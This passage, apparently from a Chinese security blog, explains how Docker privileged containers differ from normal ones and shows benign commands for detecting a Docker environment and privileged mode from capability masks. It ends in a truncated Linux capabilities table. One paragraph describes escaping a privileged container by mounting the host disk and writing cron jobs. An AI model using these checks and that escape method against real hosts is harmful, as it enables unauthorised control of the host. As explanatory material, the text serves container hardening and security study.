&lt;li&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;blockquote&gt;
&lt;p&gt;普通模式下，部分内核模块路径比如 /proc 下的一些目录需要阻止写入、有些又需要允许读写， 这些文件目录将会以 tmpfs 文件系统的方式挂载到容器中，以实现目录 mask 的需求&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$ docker run --rm -it debian:buster mount |grep &amp;#x27;/proc.*tmpfs&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;tmpfs on /proc/acpi type tmpfs (ro,relatime)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;tmpfs on /proc/kcore type tmpfs (rw,nosuid,size=65536k,mode=755)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;特权模式下，这些目录将不再以 tmpfs 文件系统的方式挂载:&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$ docker run --privileged --rm -it debian:buster mount |grep &amp;#x27;/proc.*tmpfs&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/blockquote&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;blockquote&gt;
&lt;p&gt;普通模式下，部分内核文件系统 (sysfs、procfs) 会被以只读的方式挂载到容器中，以阻止容器内进程随意修改系统内核:&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$ docker run --rm -it debian:buster mount |grep &amp;#x27;(ro&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sysfs on /sys type sysfs (ro,nosuid,nodev,noexec,relatime)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cgroup on /sys/fs/cgroup/memory type cgroup (ro,nosuid,nodev,noexec,relatime,memory)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cgroup on /sys/fs/cgroup/rdma type cgroup (ro,nosuid,nodev,noexec,relatime,rdma)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;但是在特权模式下，内核文件系统将不再以只读的方式被挂载:&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$ docker run --privileged --rm -it debian:buster mount |grep &amp;#x27;(ro&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/blockquote&gt;
&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;blockquote&gt;
&lt;p&gt;普通模式下，可以通过配置 AppArmor 或 Seccomp 相关安全选项 （如果未配置的话，容器引擎默认也会启用一些对应的默认配置） 对容器进行加固:&lt;/p&gt;
&lt;p&gt;特权模式下，这些 AppArmor 或 Seccomp 相关配置将不再生效:&lt;/p&gt;
&lt;p&gt;普通模式下也可以通过对应的安全选项来禁用 AppArmor 或 Seccomp 特性。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ol start=&#34;5&#34;&gt;
&lt;li&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;blockquote&gt;
&lt;p&gt;默认模式下，只能以只读模式操作 cgroup&lt;/p&gt;
&lt;p&gt;特权模式下，将可以对 cgroup 进行读写操作:&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ol start=&#34;6&#34;&gt;
&lt;li&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;blockquote&gt;
&lt;p&gt;普通模式下，容器内 /dev 目录下看不到节点 /dev 目录下特有的 devices&lt;/p&gt;
&lt;p&gt;特权模式下，容器内的 /dev 目录会包含这些来自节点 /dev 目录下的那些内容:&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$ docker run --privileged --rm -it debian:buster ls /dev&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;autofs           mapper              stdin   tty25  tty44  tty63    vcsa1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;btrfs-control    mcelog              stdout  tty26  tty45  tty7     vcsa2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;bus              mem                 tty     tty27  tty46  tty8     vcsa3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/blockquote&gt;
&lt;ol start=&#34;7&#34;&gt;
&lt;li&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;blockquote&gt;
&lt;p&gt;特权模式下，SELinux 相关的安全加固配置将被禁用。&lt;/p&gt;
&lt;p&gt;普通模式下也可以通过对应的安全选项来禁用 SELinux 特性。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;特权模式于版本 6.0 时被引入 Docker，允许容器内的 root 拥有外部物理机 root 权限，而此前容器内 root 用户仅拥有外部物理机普通用户权限。&lt;/p&gt;
&lt;p&gt;使用特权模式启动容器，可以获取大量设备文件访问权限。因为当管理员执行 docker run --privileged 时，Docker 容器将被允许访问主机上的所有设备，并可以执行 mount 命令进行挂载。&lt;/p&gt;
&lt;p&gt;当控制使用特权模式启动的容器时，docker 管理员可通过 mount 命令将外部宿主机磁盘设备挂载进容器内部，获取对整个宿主机的文件读写权限，此外还可以通过写入计划任务等方式在宿主机执行命令。&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9tb3ppbGxhemcuY29tLzIwMjEvMTEvZG9ja2VyLWNvbnRhaW5lci1kaWZmZXJlbmNlLWJldHdlZW4tcHJpdmlsZWdlZC1tb2RlLWFuZC1ub24tcHJpdmlsZWdlZC1tb2RlLmh0bWw=&#34;&gt;容器特权模式与非特权模式的区别 - mozillazg’s Blog&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;4docker-环境判断&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#4docker-环境判断&#34;&gt;#&lt;/a&gt; 4.docker 环境判断&lt;/h3&gt;
&lt;p&gt;1. 根据.dockerenv 判断&lt;/p&gt;
&lt;p&gt;非 docker 环境：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;[root@VM-16-11-centos ~]# ls -al /.dockerenv&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ls: cannot access /.dockerenv: No such file or directory&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;docker 环境：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;root@9b14f6362056:/# ls -al /.dockerenv &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;-rwxr-xr-x 1 root root 0 Nov 27 03:33 /.dockerenv&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;2. 根据从 group 信息&lt;/p&gt;
&lt;p&gt;非 docker 环境：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;[root@VM-16-11-centos ~]# cat /proc/1/cgroup &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11:hugetlb:/&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10:freezer:/&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9:devices:/&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8:cpuset:/&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7:blkio:/&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6:cpuacct,cpu:/&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5:pids:/&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4:perf_event:/&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3:memory:/&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2:net_prio,net_cls:/&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;1:name=systemd:/&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;docker 环境：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;root@9b14f6362056:/# cat /proc/1/cgroup &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11:hugetlb:/docker/9b14f63620563d3dcf5b23d3c80ab657812f6928b7a78fca22a61c0a072732f3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10:freezer:/docker/9b14f63620563d3dcf5b23d3c80ab657812f6928b7a78fca22a61c0a072732f3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9:devices:/docker/9b14f63620563d3dcf5b23d3c80ab657812f6928b7a78fca22a61c0a072732f3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8:cpuset:/docker/9b14f63620563d3dcf5b23d3c80ab657812f6928b7a78fca22a61c0a072732f3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7:blkio:/docker/9b14f63620563d3dcf5b23d3c80ab657812f6928b7a78fca22a61c0a072732f3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6:cpuacct,cpu:/docker/9b14f63620563d3dcf5b23d3c80ab657812f6928b7a78fca22a61c0a072732f3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5:pids:/docker/9b14f63620563d3dcf5b23d3c80ab657812f6928b7a78fca22a61c0a072732f3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4:perf_event:/docker/9b14f63620563d3dcf5b23d3c80ab657812f6928b7a78fca22a61c0a072732f3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3:memory:/docker/9b14f63620563d3dcf5b23d3c80ab657812f6928b7a78fca22a61c0a072732f3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2:net_prio,net_cls:/docker/9b14f63620563d3dcf5b23d3c80ab657812f6928b7a78fca22a61c0a072732f3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;1:name=systemd:/docker/9b14f63620563d3dcf5b23d3c80ab657812f6928b7a78fca22a61c0a072732f3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;5特权模式判断&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#5特权模式判断&#34;&gt;#&lt;/a&gt; 5. 特权模式判断&lt;/h3&gt;
&lt;p&gt;可通过 cat /proc/self/status |grep Cap 命令判断当前容器是否通过特权模式起（000000xfffffffff 代表为特权模式起）&lt;/p&gt;
&lt;p&gt;常见的有 &lt;code&gt;0000001fffffffff&lt;/code&gt; ， &lt;code&gt;0000003fffffffff&lt;/code&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;[root@VM-16-11-centos ~]# docker run -it --privileged ubuntu:18.04  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;root@8ed8accc6562:/# cat /proc/self/status | grep Cap&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;CapInh:	0000001fffffffff&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;CapPrm:	0000001fffffffff&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;CapEff:	0000001fffffffff&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;CapBnd:	0000001fffffffff&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;CapAmb:	0000000000000000&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;[root@VM-16-11-centos ~]# docker run -it ubuntu:18.04  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;root@980122e5f1f2:/# cat /proc/self/status |grep Cap&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;CapInh:	00000000a80425fb&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;CapPrm:	00000000a80425fb&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;CapEff:	00000000a80425fb&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;CapBnd:	00000000a80425fb&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;CapAmb:	0000000000000000&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;[root@VM-16-11-centos ~]# capsh --decode=0000001fffffffff&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x0000001fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,35,36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[root@VM-16-11-centos ~]# capsh --decode=0000003fffffffff&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,35,36,37&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;通过 capsh 查看当前 shell 的 capabilities，0000001 和 0000003 权限只相差 &lt;code&gt;37&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;6linux-capabilities-补充&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#6linux-capabilities-补充&#34;&gt;#&lt;/a&gt; 6.Linux Capabilities （补充）&lt;/h3&gt;
&lt;p&gt;root 是 linux 中的最高权限，可以安装软件、允许某些服务、管理用户等。作为普通用户，如果想执行某些只有管理员才有权限的操作，以前只有两种办法：一是通过  &lt;code&gt;sudo&lt;/code&gt;  提升权限，如果用户很多，配置管理和权限控制会很麻烦；二是通过 SUID（Set User ID on execution）来实现，它可以让普通用户允许一个  &lt;code&gt;owner&lt;/code&gt;  为 root 的可执行文件时具有 root 的权限。&lt;/p&gt;
&lt;p&gt;通过  &lt;code&gt;sudo&lt;/code&gt;  提升权限，如果用户很多，配置管理和权限控制会很麻烦，我们需要修改 sudo 的配置文件 &lt;code&gt;/etc/sudoers&lt;/code&gt; ；而使用 SUID 时，通常只是需要很小一部分的特权，但是  &lt;code&gt;SUID&lt;/code&gt;  给了它 root 具有的全部权限。这些可执行文件是黑客的主要目标，如果他们发现了其中的漏洞，就很容易利用它来进行安全攻击。&lt;/p&gt;
&lt;p&gt;为了对 root 权限进行更细粒度的控制，实现按需授权，Linux 引入了另一种机制叫  &lt;code&gt;capabilities&lt;/code&gt; 。&lt;/p&gt;
&lt;p&gt;它对用户的权限进行了更细致的分类，可以对单个线程进行更精度的权限控制。避免粗暴的 root 特权用户和常规用户的简单区分。当一个进程要进行某个特权操作时，操作系统会检查 cap_effective 的对应位是否有效，而不再是检查进程的有效 UID 是否为 0。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Capabilities&lt;/code&gt;  机制是在 Linux 内核  &lt;code&gt;2.2&lt;/code&gt;  之后引入的，原理很简单，就是将之前与超级用户 root（UID=0）关联的特权细分为不同的功能组，Capabilites 作为线程的属性存在，每个功能组都可以独立启用和禁用。其本质上就是将内核调用分门别类，具有相似功能的内核调用被分到同一组中。&lt;/p&gt;
&lt;p&gt;这样一来，权限检查的过程就变成了：在执行特权操作时，如果线程的有效身份不是 root，就去检查其是否具有该特权操作所对应的 capabilities，并以此为依据，决定是否可以执行特权操作。&lt;/p&gt;
&lt;p&gt;Capabilities 可以在进程执行时赋予，也可以直接从父进程继承。所以理论上如果给 nginx 可执行文件赋予了  &lt;code&gt;CAP_NET_BIND_SERVICE&lt;/code&gt;  capabilities，那么它就能以普通用户运行并监听在 80 端口上。同时 nginx 父进程会根据配置文件启动 worker，因此 nginx 运行时需要 inheritable 的权限&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th style=&#34;text-align:left&#34;&gt;apability 名称&lt;/th&gt;
&lt;th style=&#34;text-align:left&#34;&gt;描述&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;CAP_AUDIT_CONTROL&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;启用和禁用内核审计；改变审计过滤规则；检索审计状态和过滤规则&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;CAP_AUDIT_READ&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;允许通过 multicast netlink 套接字读取审计日志&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;CAP_AUDIT_WRITE&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;将记录写入内核审计日志&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;CAP_BLOCK_SUSPEND&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;使用可以阻止系统挂起的特性&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;CAP_CHOWN&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;修改文件所有者的权限&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;CAP_DAC_OVERRIDE&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;忽略文件的 DAC 访问限制&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;CAP_DAC_READ_SEARCH&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;忽略文件读及目录搜索的 DAC 访问限制&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;CAP_FOWNER&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;忽略文件属主 ID 必须和进程用户 ID 相匹配的限制&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;CAP_FSETID&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;允许设置文件的 setuid 位&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;CAP_IPC_LOCK&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;允许锁定共享内存片段&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;CAP_IPC_OWNER&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;忽略 IPC 所有权检查&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;CAP_KILL&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;允许对不属于自己的进程发送信号&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;CAP_LEASE&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;允许修改文件锁的 FL_LEASE 标志&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;CAP_LINUX_IMMUTABLE&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;允许修改文件的 IMMUTABLE 和 APPEND 属性标志&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;CAP_MAC_ADMIN&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;允许 MAC 配置或状态更改&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;CAP_MAC_OVERRIDE&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;忽略文件的 DAC 访问限制&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
